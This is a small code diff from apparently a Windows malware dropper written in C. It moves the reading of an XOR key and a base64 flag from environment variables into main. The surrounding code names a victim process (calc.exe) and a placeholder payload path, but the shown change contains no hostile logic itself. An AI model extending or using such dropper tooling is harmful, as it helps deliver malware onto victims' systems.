@@ -49,16 +49,22 @@ char name[10 * NAME_SIZE];
 // (char*) C:\\example\\path\\to\\your\\payload.exe
 char* victim_name = (char*) "C:\\Windows\\System32\\calc.exe";
 
-int xor_key = atoi(getenv("DROPPER_XOR_KEY"));
+int xor_key;
 
-char* env = getenv("DROPPER_BASE64");
-bool base64 = (env && strcmp(env, "true") == 0);
+char* env;
+
+bool base64;
 
 // Entry Point
 int main(int argc, char* argv[])
 {
 
-	printf("The xor key is: %d. The base64 is: %d", xor_key, base64);
+	xor_key = atoi(getenv("DROPPER_XOR_KEY"));
+
+	env = getenv("DROPPER_BASE64");
+	base64 = (env && strcmp(env, "true") == 0);
+
+	printf("The xor key is: %d. The base64 is: %d\n", xor_key, base64);
 
 	// Handle to myself
 	HMODULE h = GetModuleHandle(NULL);
